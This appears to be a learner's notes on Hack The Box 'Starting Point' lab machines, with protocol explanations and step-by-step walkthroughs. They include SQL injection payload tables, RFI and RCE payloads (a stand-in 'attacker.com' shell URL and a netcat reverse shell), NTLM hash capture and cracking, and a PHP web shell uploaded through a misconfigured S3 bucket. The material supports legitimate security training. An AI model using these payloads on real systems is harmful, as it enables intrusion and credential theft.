# Notes as I go through "Starting Point"

## Machines
## 1. Meow
- Telnet is a network protocol and command-line tool that allows you to connect to remote machines over TCP port 23. It gives you a text-based shell or interface, assuming the service is running and doesn’t require strict authentication. SSH has replaced Telnet
- Nmap is used to discover open ports, services and more.
- nmap command used for easy machine --> _$~nmap -sV -O -Pn -n -p- -T5 TargetIP_
  - -sV: Service version detection
  - -O: Operating System detection
  - -Pn: Skip host discovery (assume host is up — useful for HTB)
  - -n: Don’t resolve DNS (faster)
  - -p-: Scans all TCP ports
  - -T5: Fastest timing (safe for most HTB machines)
  
- Telnet can be logged in with "root" without a password just with this command below
  - _$~telnet IP_
  - Then login with "root", no password needed
  - List directory with _$~ls_ and then grab flag with _$~cat_ --> _$~cat flag.txt_

* * *

## 2. Fawn
- FTP (File Transfer Protocol) is a standard network protocol used to transfer files between a client and a server.
- Common FTP Commands (interactive shell):
  - -?: help menu
  - After connecting (ftp _TargetIP_), you can use:
  - ls: List files
  - get filename: Download file
  - put filename: Upload file
  - cd dir: Change directory
  - exit / bye: Disconnect
 
- Authentication with FTP
  - Standard user+pass
  - name: anonymous
  - pass: blank or email

- Use "~sudo ftp TargetIP" if downloads are not working

* * *

## 3. Dancing
- SMB (Server Message Block) is a network file sharing protocol that allows systems (especially Windows) to:
  - Share files
  - Access printers
  - Communicate between nodes (file transfers, authentication, etc.)

- Common Ports
  - 445 (Common, modern SMB)
  - 139 (older NetBIOS session)
 
- Command to login to smb to list shares (using _smbclient_)
  - $~smbclient -L //_TargetIP_ -N
    - -L: List shares
    - -N: No password (anon login)
  - Connecting to a share
    - $~smbclient //_TargetIP_/_share_name_ -N
    - **Make sure _-L_ isn't in your command to connect to a share**
   
- Common smbclient commands
  - ls: List files
  - cd dir: Change directory
  - get file: Download a file (e.g. get flag.txt)
  - pwd: Show current directory
  - exit: Quit the session

* * *

## 4. Redeemer
- Redis is a super-fast, in-memory key-value database — it's like a giant dictionary stored in RAM that apps use to quickly save and look up small bits of data.
  - Think: key → value storage, but lightning fast and temporary (unless configured for persistence).
  - Commonly used for: caching, session storage, real-time data.
 
- Common commands for redis

| Command                 | Action                          |
|:------------------------|:--------------------------------|
| `SET key value`         | Set a key with a value          |
| `GET key`               | Get the value of a key          |
| `DEL key`               | Delete a key                    |
| `EXPIRE key seconds`    | Set a timeout for a key         |
| `HSET hash field value` | Set a field in a hash           |
| `HGET hash field`       | Get a field from a hash         |
| `KEYS pattern`          | List all keys matching pattern  |
| `FLUSHALL`              | Remove all keys in the database |

- Loggin into Redis
  - $~redis-cli -h _TargetIP_ -p _port_
  - If a password is required
  - $~redis-cli -h _TargetIP_ -p _port_ -a _password_
 
- Navigating Redis
  - KEYS *: shows all keys
  - EXISTS key_name: check if key exists
  - TYPE key_name: checks type of a key
  - GET key_name: get value of a key
 
- Extracting data: To extract data from Redis, it depends on the type of data stored. Here are some common scenarios:
  - GET flag: for a string
  - LRANGE list_name 0 -1: for a list
  - HGETALL hash_name: for a hash
  - SMEMBERS set_name: for a set
 
_$~redis-cli -h TargetIP --> KEYS * --> GET flag_

* * *

## 5. Explosion
- Remote Desktop Protocol (RDP) allows remote graphical access to Windows systems. It's mostly used by administrators and help desks to control systems across a network.

#### Tools to Access RDP

| Tool       | Platform    | Description                         |
|:-----------|:------------|:------------------------------------|
| `mstsc`    | Windows     | Built-in GUI RDP client             |
| `xfreerdp` | Linux/macOS | Modern, feature-rich RDP client     |
| `rdesktop` | Linux       | Older RDP client                    |
| `Remmina`  | Linux (GUI) | RDP + VNC GUI client for Linux      |

#### Common Commands & Switches
- xfreerdp (most modern and flexible)

| Switch              | Description              |
| :------------------ | :----------------------- |
| `/v:IP`             | Target RDP IP address    |
| `/u:username`       | Username                 |
| `/p:password`       | Password                 |
| `/cert:ignore`      | Ignore SSL cert warnings |
| `/f`                | Fullscreen mode          |
| `/clipboard`        | Enable clipboard sharing |
| `/drive:share,path` | Share local drive to RDP |

- Logging in to RDP (Linux): REQUIRES CREDENTIALS (/u:username) BUT DOES NOT REQUIRE PASSWORD
  - $~xfreerdp /u:_username_ /p:password /v:_TargetIP_ /cert:ignore
 
_$~xfreerdp /v:10.129.1.13 /u:administrator /cert:ignore --> enter blank password --> successfully entered RDP session_

* * *

## 6. Preignition
- NGINX is a high-performance, open-source web server and reverse proxy server. It's widely used to serve websites, APIs, and static files.
  - NGINX delivers web pages to your browser and can also forward requests to backend services (like APIs or databases).
- Directory busting is a method used during web reconnaissance to discover hidden directories and files on a web server (NGINX) by brute-forcing common paths using a wordlist.
**Tools for Directory Busting**

| Tool        | Description                           |
| :---------- | :------------------------------------ |
| `gobuster`  | Fast and modern directory bruteforcer |
| `ffuf`      | Flexible Fuzzing Tool                 |
| `dirbuster` | GUI-based tool from OWASP             |
| `dirb`      | Lightweight command-line brute tool   |

**Common Gobuster Switches**  

| Switch | Description                                             | Example Value                          |
| :----- | :------------------------------------------------------ | :------------------------------------- |
| `dir`  | **Answer:** Tells Gobuster to perform directory busting | *(no value needed)*                    |
| `-w`   | Wordlist path                                           | `/usr/share/wordlists/dirb/common.txt` |
| `-u`   | Target URL                                              | `http://10.10.10.10/`                  |
| `-x`   | **Answer:** Add file extensions to check                | `php`                                  |
| `-t`   | Number of concurrent threads                            | `50`                                   |
| `-o`   | Output file for results                                 | `found_dirs.txt`                       |
| `-k`   | Ignore SSL certificate warnings                         | *(no value needed)*                    |
| `-s`   | Expected HTTP status codes                              | `200,204,301,302,403`                  |
| `-e`   | Expanded output (shows full URL)                        | *(no value needed)*                    |

**Common Wordlists (Full Paths on Kali/Parrot)**

| Wordlist                        | Path                                                                    | Purpose                    |
| :------------------------------ | :---------------------------------------------------------------------- | :------------------------- |
| `common.txt`                    | `/usr/share/wordlists/dirb/common.txt`                                  | Basic wordlist             |
| `big.txt`                       | `/usr/share/wordlists/dirb/big.txt`                                     | Larger brute-force list    |
| `directory-list-2.3-medium.txt` | `/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt`          | Popular medium list        |
| `raft-medium-directories.txt`   | `/usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt` | Structured wordlist        |
| `common.txt (SecLists)`         | `/usr/share/seclists/Discovery/Web-Content/common.txt`                  | Great general-purpose list |

- If you're missing any of these, run: _$~sudo apt install seclists_

- Full gobuster command
  - _$~gobuster dir -u http://IP_ADDRESS/ -w /usr/share/wordlists/dirb/common.txt -x php -t 50_
- Example results
  - /admin.php 
  - /index.php

- Check admin page for default credentials -->  user:admin pass:admin

* * *

## 7. Mongod
- MongoDB is a NoSQL document-based database. Instead of storing data in rows and columns (like SQL), it uses JSON-like documents. It's used for flexible, scalable data storage.
  - MongoDB is a database that stores data in key-value pairs inside collections, not tables.
**Common MongoDB Shell Commands**

| Command                   | Description                      | Example Value       |
| :------------------------ | :------------------------------- | :------------------ |
| `show dbs`                | List all databases               | –                   |
| `use`                     | Switch to a database             | `use mydatabase`    |
| `show collections`        | List collections in current DB   | –                   |
| `db`                      | Show current database            | –                   |
| `db.collection.find()`    | View all documents in collection | `db.users.find()`   |
| `db.collection.count()`   | Count documents in a collection  | `db.flags.count()`  |
| `db.collection.findOne()` | Show one document                | `db.flag.findOne()` |
| `db.collection.drop()`    | Delete collection (be careful)   | –                   |
| `exit`                    | Leave the shell                  | –                   |

**How to Login, Navigate, and Extract Data**
1. _$~ mongosh IP:port_ --> If you get version mismatch errors, try using _mongo_ if available or downgrade _mongosh_.
2.  _> show dbs_
3.  _> use database_name_
4.  _>show collections_
5.  _>db.collection_name.find().pretty()_

### Note
> When attempting this machine, the current installed version of mongosh was not compatible with the MondoDB server. There was no workaround with the HTB Pwnbox. I could not downgrade mongosh, nor could I install mongo. Regardless, I understood the machine and completed it by following the write-up. Thank you.

* * *

## 8. Synced
- rsync is a fast and versatile file copying tool used to synchronize files and directories between two locations over a network or locally. It uses a delta-transfer algorithm to send only the changed parts of files.
  - rsync helps you copy files and folders between computers, or just make sure two places have the same files — kind of like a smarter, faster version of copy-paste that can work over the internet.
  - rsync typically uses SSH for authentication.
    - But in some CTF scenarios, rsync may allow anonymous access (no password) — especially if it’s running as a public rsync daemon.
###  General Syntax for Remote Access
_$~ rsync [options] rsync://IP_or_Hostname/module/_
- The module is like a shared folder offered by the rsync server.
  - You don’t really "log in" and "navigate" like SSH or FTP. Instead, you list what's shared, then pull files from it.

### Common rsync Commands and Switches

| Switch | Name               | Description                                                                 |
|:-------|:-------------------|:----------------------------------------------------------------------------|
| -a     | Archive            | Recursively copy and preserve symbolic links, permissions, modification times, etc. |
| -v     | Verbose            | Show detailed output of what `rsync` is doing                              |
| -z     | Compression        | Compress file data during the transfer                                      |
| -r     | Recursive          | Copy directories recursively (included in `-a`)                             |
| -e     | Remote shell       | Specify the remote shell to use (e.g., `-e ssh`)                            |
| -P     | Progress           | Show progress and allow resume of interrupted transfers (`--partial --progress`) |
| --list-only | List only     | Show what would be transferred, without actually copying                    |
| --delete | Delete           | Delete extraneous files from destination dirs                               |
| -n     | Dry run            | Simulate the transfer, showing what would happen without making changes     |

### Example Steps for CTF
1. rsync rsync://10.10.10.10/ (List Modules (Shared Folders like "public" or "Anonymous Shares"))
2. rsync --list-only rsync://10.10.10.10/public/ (List Files Inside a Module ("public")
3. rsync -P rsync://10.10.10.10/public/flag.txt . (This will download "flag.txt" to your current directory.)
4. Done

* * *

## 9. Appointment
- SQL (Structured Query Language) is a standard language used to manage and manipulate relational databases by performing tasks like querying data, updating records, or deleting tables.
- SQL Injection (SQLi) is a vulnerability that allows an attacker to interfere with the queries an application makes to its database. It can be used to bypass login, extract data, or even modify the database.

### Common SQL Commands

| Command     | Description                                      | Example                            |
|:------------|:--------------------------------------------------|:-----------------------------------|
| SELECT      | Retrieve data from one or more tables             | SELECT * FROM users;               |
| INSERT      | Add new data into a table                         | INSERT INTO users VALUES (...);    |
| UPDATE      | Modify existing data in a table                   | UPDATE users SET name='Joe';       |
| DELETE      | Remove data from a table                          | DELETE FROM users WHERE id=1;      |
| CREATE      | Create a new table or database                    | CREATE TABLE users (...);          |
| DROP        | Delete a table or database                        | DROP TABLE users;                  |

### Common SQL Injection Payloads 
- Can replace "--" with "#")
   - "--" must have a space after in order for syntax to be correct

| Payload                         | Purpose                                      | Description                        |
|:--------------------------------|:---------------------------------------------|:-----------------------------------|
| ' OR 1=1 --                    | Bypass login                                | Always true, skips password check |
| ' OR 1=1 #                         | Bypass login                                | Always true, comments out rest       |
| admin' --                      | Login as admin without password              | Comments out the rest             |
| admin' #                           | Login as admin without password              | Comments out password clause         |
| ' UNION SELECT null,null --   | Test for UNION-based injection               | Combines multiple SELECTs         |
| ' UNION SELECT null,null #        | Test for UNION-based injection               | Checks for compatible column count   |
| ' AND 1=2 --                   | False condition for testing filtering        | Useful for confirming injection   |
| ' AND 1=2 #                        | False condition for testing filtering        | Used to trigger no results           |
| ' ORDER BY 1 --                | Check number of columns                      | Used to trigger errors            |
| ' ORDER BY 1 #                     | Check number of columns                      | Triggers error if column doesn't exist |
| ' OR 'a'='a' --                | Classic tautology                            | Always true                       |
| ' OR 'a'='a' #                     | Classic tautology                            | Always true                          |
| ' OR 1=1 LIMIT 1 #                | Selects only one result                      | Avoids long output                   |
| ' AND ASCII(SUBSTRING(user(),1,1))=114 # | Blind SQLi payload                      | Extracts info character by character |
| 1' AND SLEEP(5) #                 | Time-based Blind SQLi                        | Detects injection via response delay |



### How to solve CTF
1. Scan for open ports --> _~$ nmap -sV -O -Pn -n -p- -T5 TargetIP_
2. Notice port 80 http is open.
3. Check for web application
4. Perfom directory busting --> _$~gobuster dir -u http://IP_ADDRESS/ -w /usr/share/wordlists/dirb/common.txt
5. Conduct SQL injection on login form --> _admin' #_
6. Done

* * *

## 10. Squel
MariaDB is an open-source relational database management system (RDBMS), a fork of MySQL. It uses SQL (Structured Query Language) to manage data and is often used in web applications. It's compatible with MySQL, but has performance and licensing improvements.
### Accessing MariaDB commands
- Local
  - Authenticated _~$ mysql -u root -p_
  - unauthenticated _~$ mysql -u root_
- Remote
  - Authenticated _~$ mysql -h target_ip -u username -p_
  - unauthenticated _~$ mysql -h target_ip_ `or if misconfigured` _~$ mysql -h target_ip -u root_
### Common mysql Command-line Switches

| Switch | Description                    | Example               |
| :----- | :----------------------------- | :-------------------- |
| `-u`   | Username                       | `-u root`             |
| `-p`   | Prompt for password            | `-p`                  |
| `-h`   | Host IP or hostname            | `-h 10.10.10.10`      |
| `-P`   | Port number                    | `-P 3306`             |
| `-e`   | Execute SQL statement and exit | `-e "SHOW DATABASES"` |

### MariaDB/MySQL Basic SQL Syntax

| Command                     | Description                        | Example                       |
| :-------------------------- | :--------------------------------- | :---------------------------- |
| `SHOW DATABASES;`           | List all databases                 | `SHOW DATABASES;`             |
| `USE database_name;`        | Select a database to work with     | `USE testdb;`                 |
| `SHOW TABLES;`              | List all tables in the selected DB | `SHOW TABLES;`                |
| `DESCRIBE table;`           | Show structure of a table          | `DESCRIBE users;`             |
| `SELECT * FROM table;`      | Show all data in a table           | `SELECT * FROM flag;`         |
| `SELECT column FROM table;` | Get specific column data           | `SELECT username FROM users;` |

Steps to completion.
1. _~$ nmap -sV -sC -O -Pn -n -T5 -p 3306 TargetIP_
2. _~$ mysql -h targetIP -u root_
3. Logged into database
4. _> show databases;_
5. _> use htb;_
6. _> show tables;_
7. _> select * from config;_
8. Flag captured

* * *

## 11. Crocodile

What Nmap scanning switch employs the use of default scripts during a scan? _-sC_

### Methodology
- Nmap scan is performed. _~$ nmap -sV -sC -O -Pn -n -p- -T5 10.129.138.235_
  - Port 21 (ftp) and port 80 (http) is open.
- Try to find useful data with ftp.
  - _~$ ftp TargetIP_
    - Found _allowed.userlist_ and _allowed.userlist.passwd_
    - username "admin" discovered
    - Extract files with _get_ --> _~$ get allowed.userlist_
- Perform directory busting on http web application.
  - use gobuster with `-x` switch to look for .php filetypes
  - _~$ gobuster dir -u TargetIP -w /usr/share/wordlists/dirb/common.txt -x php_
    - _`/login.php` and `/config.php`_ discovered --> attempting login with credentials on `/login.php`
    - admin credentials are successful
- _**Flag Captured**_
- _**Machine Pwned**_

* * *

## 12. Responder
### Remote File Inclusion (RFI)
- RFI is when a web app loads and executes a file from an external source (like your server) due to insecure code like include($_GET['page']); in PHP.
  - Goal: Trick the server into loading your malicious script from a remote URL.
### Remote Code Execution (RCE)
- RCE is when an attacker can run arbitrary commands or code on a server, often leading to full control.
  - RCE is the end goal of many attacks — like RFI, LFI, insecure deserialization, or command injection.
### etc/hosts/
- The /etc/hosts file is a local DNS override file used by your operating system to map domain names to IP addresses manually.
- Why You Need It for HTB or CTF
  - HTB and CTF machines often ask you to access a web application by a hostname like internal.htb, dev.machine.htb, or admin.intranet.local. But these fake/internal domains don’t exist publicly, so:
    - Your system won’t resolve them using normal DNS.
    - Adding them to /etc/hosts forces your machine to treat them like real domains.

### New Technology LAN Manager (NTLM)
- NTLM (NT LAN Manager) is a Microsoft authentication protocol used to verify the identity of users and systems in Windows environments, especially older or internal networks.
- How it works
    - Client sends username to server.
    - Server replies with a random challenge.
    - Client hashes the password with the challenge and sends it back.
    - Server checks this hash against its stored credentials (usually via a domain controller or local user list).
- CTF & Pentesting Context (NTLM)

| Use Case                 | Description                                                                       |
| ------------------------ | --------------------------------------------------------------------------------- |
| **Hash Capture**         | You can capture NTLM hashes using responder, SMB relays, etc.                     |
| **Cracking Hashes**      | Use tools like `hashcat` or `john` to crack NTLMv1/NTLMv2 hashes.                 |
| **Pass-the-Hash**        | Authenticate using a stolen NTLM hash without knowing the password.               |
| **Brute Force or Spray** | Try NTLM login against SMB, RDP, etc. using tools like `hydra` or `crackmapexec`. |

  

### What to Look For During Testing (LFI & RFI)
| Indicator                                         | Description                                     |
| ------------------------------------------------- | ----------------------------------------------- |
| URL parameters with `page=`, `file=`, `template=` | May allow inclusion of external or local files  |
| Forms or inputs that trigger backend processing   | Possible injection points                       |
| Error messages showing file paths                 | Reveal vulnerable includes or misconfigurations |
| Responses reflecting content from other sources   | May indicate RFI is working                     |

### Common RFI Payloads
| Payload                                                 | Purpose                                     |
| ------------------------------------------------------- | ------------------------------------------- |
| `http://attacker.com/shell.txt`                         | Load your reverse shell or PHP payload      |
| `//attacker.com/shell.txt`                              | Bypass filters (protocol-relative URL)      |
| `php://filter/convert.base64-encode/resource=index.php` | LFI payload to view source                  |
| `../../../../../../etc/passwd`                          | LFI (can lead to RCE if combined with logs) |

### Common RCE Payloads
| Payload                        | Context / Example Use                            |
| ------------------------------ | ------------------------------------------------ |
| `;id` or `&& whoami`           | Command injection test in URL or form field      |
| `127.0.0.1 && nc -e /bin/bash` | RCE via injected netcat reverse shell            |
| `' + system('id') + '`         | RCE in PHP or Python-based templates             |
| `${@system($_GET['cmd'])}`     | PHP RCE in misconfigured templates or eval calls |
| `$(whoami)`                    | Unix-style command substitution                  |

### Responder
- Responder is a powerful LLMNR/NBT-NS/MDNS poisoner used in penetration testing to capture NTLMv1/v2 hashes on a local network.
#### Basic Usage
- sudo responder -I tun0 --> or eth0 for home labs (tun0 for htb)
#### Common Switches and Their Purpose
| Switch       | Description                                                                |
| ------------ | -------------------------------------------------------------------------- |
| `-I <iface>` | Specify the network interface (e.g., `eth0`, `tun0`) to listen on          |
| `-v`         | Verbose output (see more details about incoming requests)                  |
| `-f`         | Fingerprint hosts when they respond                                        |
| `-w`         | Enable WPAD rogue proxy server                                             |
| `-r`         | Enable NetBIOS name service (NBT-NS) poisoning                             |
| `-d`         | Enable DHCP server (for DHCP poisoning; rarely needed)                     |
| `-F`         | Force NTLM authentication for WPAD (useful when targeting domain machines) |
| `-A`         | Analyze mode — runs tests and prints host information, but doesn’t poison  |

#### Example Commands
- Start Responder on VPN interface (tun0):
  - sudo responder -I tun0

- Start with full poisoning and verbose logging:
  - sudo responder -I tun0 -wrf -v

- Start in analyze-only mode (no spoofing, just info):
  - sudo responder -I tun0 -A
#### Where Are Captured Hashes Stored
- /usr/share/responder/logs/

 
### Methodology
1. Perform nmap scan --> `_nmap -sV -T5 TargetIP_` --> **Port 80 open, http service detected**
- I noticed OpenSSL and PHP service and version discovered with nmap scan
2. Attempt to access web service using IP address, arrive to "unika.htb", but not able to connect
3. Add "unika.htb" to `etc/hosts/` file
4. Access web page --> PHP scripting language discovered using "Wappalyzer" broswer extension.
5. Navigate web page, clicking different buttons and links, once I clicked on changing the web page language then URL parameters revealed that "page=" was being used to load in different languages.
6. Attempting to perform LFI on "page=" parameter with this payload "../../../../../../../../windows/system32/drivers/etc/hosts" --> successful!
7. Attempt to steal password hash from NTLM authentication of SMB using responder
8. Responder command --> `_responder -I tun0_`
9. Set parameter in URL to Remote File Inclution payload so the target would attemt to connect to our machine.
10. Payload --> `_//10.10.14.16/somefile_` --> make sure IP is your machine
11. Once hash is recieved from responder, copy it to .txt file then send it to John The Ripper for cracking
12. `echo "hash" > hash.txt` (copy hash from reponder to txt file)
12. JTR command --> `_john -w=/usr/share/wordlists/rockyou.txt hash.txt`
13. Password hash cracked!
14. Login to Microsoft HTTPAPI httpd 2.0 on port 5985, which is the Windows Remote Management (WinRM) service
15. Use `evil-winrm` to login to the WinRM service. Use cracked password and username from responder
16. `_evil-winrm -i TargetIP -u username -p password_` --> success!
17. Navigate the windows machine using powershell. Initial directory --> `*Evil-WinRM* PS C:\Users\Administrator>`
18. `ls` = list, `cd` = change directories, `type` = show content of a file
19. Flag Captured!
20. Machine Pwned.

#### Post Notes
- I got stuck a couple times in this machine, looked up alot of things especially with responder, I got stuck on it for a second, just needed to use the right IP for the RFI payload. John the ripper was easy to use, I just had to extract the "rockyou.txt" file as it wasnt unzipped initially. "Lastly, jsut looked up a couple of powershell commands to navigate and capture the flag. Other than that, not too bad.

* * *

## 13. Three

### Methodology
Going in blind.
1. Time for reconnaisance and enumeration.
2. I will start with an nmap scan --> `_ sudo nmap -p- -sC -sV --min-rate 1000 TargetIP_`
3. SSH service dsicovered on port 22 and http discovered on port 80. OS is discovered to be linux
4. Lets check on the web service. Navigate to the target IP in the browser.
5. Discovered email and domain in contact info section "thetoppers.htb"
6. add domain to hosts file and map to target IP
7. Start enumeration of directories and subdomains of "thetoppers.htb"
8. Directory enumeration with ffuf --> `~$ ffuf -u http://thetoppers.htb/FUZZ -w /usr/share/wordlists/dirb/common.txt`
9. Subdomain enumeration with ffuf --> `~$ ffuf -u http://thetoppers.htb -H "Host: FUZZ.thetoppers.htb" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -fs 0`
10. Using wfuzz as ffuf is not working well. -- > `~$ wfuzz -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt --hc 200 -u http://thetoppers.htb -H "Host: FUZZ.thetoppers.htb"`
11. Dir enum went well, but subdomain enum wasnt working that well in HTB's PwnBox I belive due to the nature of virtual hosts... The correct subdomain is "s3" which was only discovered as status code `404`.
12. Moving on, time to enumerate the newly discovered subdomain. Will use ffuf, gobuster, and `curl -I s3.toppers.htb` to find directories and useful headers.
13. Discovered _/health_ directory that dispalyed the status of services which were either _"available"_ or _"running"_.
14. I learned that the subdomain _"s3"_ is running `amazon s3`.
15. Next is to access or interact with the `amazon s3` service.
16. To interact with the amazon s3 service, `awscli` is a solution.
* * *
### What is awscli
- The AWS CLI is a command-line tool used to interact with AWS services — including S3 — through simple commands and options.
  - Simple Use: You can list, download, upload, and manage S3 buckets and files.
### Common awscli S3 Commands
| Command                  | Description                              |
| ------------------------ | ---------------------------------------- |
| `aws s3 ls`              | List all buckets or contents of a bucket |
| `aws s3 cp`              | Copy file to/from a bucket               |
| `aws s3 sync`            | Sync folder locally and in bucket        |
| `aws s3api list-buckets` | List buckets using raw API call          |
| `aws s3api list-objects` | List contents of a specific bucket       |
### Required Setup (For HTB-style anonymous or weak setups)
- Sometimes no credentials are required. Run this to set dummy creds --> `aws configure`
  - Access Key ID: test
  - Secret Access Key: test
  - Region: us-east-1
  - Output format: json
### Tips for CTFs/HTB
- Always include --endpoint-url http://s3.thetoppers.htb for non-AWS targets.
- Bucket names are often guessable (like thetoppers, files, flag, public).
- Combine with ffuf to brute bucket names and file names.
* * *
17. Got stuck and looked at the official writeup. Gobuster was a better tool to use for enumeration as it has a vhost enumeration setting which will require the flag `--append-domain` in the command.
18. Gobuster command --> `gobuster vhost -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -u http://thetoppers.htb --append-domain`
19. Found `s3.thetoppers.htb` easily
20. Add subdomain to /etc/hosts file as well which I already did
21. To list all s3 buckets hosted by the server use the `ls` flag when using `awscli`
22. awscli command --> `~$ aws --endpoint=http://s3.thetoppers.htb s3 ls`
23. We can also use the ls command to list objects and common prefixes under the specified bucket.
24. awscli command --> `~$aws --endpoint=http://s3.thetoppers.htb s3 ls s3://thetoppers.htb`
  - Discovered:
                                 PRE images/
    - 2025-05-06 16:50:58          0 .htaccess
    - 2025-05-06 16:50:58      11952 index.php

25. `awscli` has got another feature that allows us to copy files to a remote bucket. We already know that the
website is using PHP. Thus, we can try uploading a PHP shell file to the `S3` bucket and since it's uploaded to
the webroot directory we can visit this webpage in the browser, which will, in turn, execute this file and we
will achieve remote code execution.
26. We can use the following PHP one-liner which uses the `system()` function which takes the URL parameter `cmd` as an input and executes it as a system command.
27. `<?php system($_GET["cmd"]); ?>`
28. Let's create a PHP file to upload.
29. `$ echo '<?php system($_GET["cmd"]); ?>' > shell.php`
30. Then, we can upload this PHP shell to the thetoppers.htb S3 bucket using the following command.
31. `aws --endpoint=http://s3.thetoppers.htb s3 cp shell.php s3://thetoppers.htb`
32. We can confirm that our shell is uploaded by navigating to _http://thetoppers.htb/shell.php_.
33. Let us try executing the OS command `id` using the URL parameter `cmd`. --> `?cmd=id`
34. If successful, time to get a reverse shell.
35. I will just copy the same steps the get command injection in the s3 bucket but for a reverse shell
36. Using `revshells.com` I copied the `"PHP Pentest Monkey"` reverse shell payload to a file called `revshell.php`
37. I uploaded the file to the s3 bucket the same way as in step 31. --> `aws --endpoint=http://s3.thetoppers.htb s3 cp revshell.php s3://thetoppers.htb`
38. Next I setup a netcat listener on port 4242 (any unused and uncommon port) --> `nc -lnvp 4242`
39. Then I simply navigated to the revshell.php file I uploaded located `http://thetoppers.htb/revshell.php`
40. Lo and behold, we get a reverse shell. Time to find the flag.
41. Flag located at `/var/www/flag.txt`
42. Flag captured
43. Machine Pwned

* * *

## 14. Ignition

### Methodology
1. Nmap scan of the target
  - nmap -sV -sC --min-rate 1000 -p- "TargetIP"
  - Port 80 HTTP service detected (`nginx 1.14.2`)
2. Navigate to IP address using curl and on browser
  - `curl -v http://TargetIP`
  - HTTP response code `302` recieved
  - ignition.htb domain discovered, not accessible
3. Add domain + IP to `/etc/hosts/` file
  - `sudo nano /etc/hosts/`
4. Navigate to web application "ignition.htb" --> successful!
5. Enumerate (bust) directories
  - `ffuf -u http://ignition.htb/FUZZ -w /usr/share/wordlists/dirb/common.txt`
  - `/admin` page found for "Magento"
6. Attempt default credentials
  - Look up "magento" default credentials and password requirements and most common passwords in 2023 (https://community.spiceworks.com/t/most-common-passwords-of-2023-the-top-10/963430)
  - List discovered
7. Use list in a brute force attack on the admin account.
  - I used burp suite's `intruder` to brute force
  - Login successful with one of the passwords from the list
8. `Flag captured`
9. Machine Pwned!

* * *

## 15. Bike
## 16. Funnel
## 17. Pennyworth
### 18. Tactics
## 19. Archetype
## 20. Oopsie
## 21. Vaccine
## 22. Unified
## 23. Included
## 24. Markup
## 25. Base





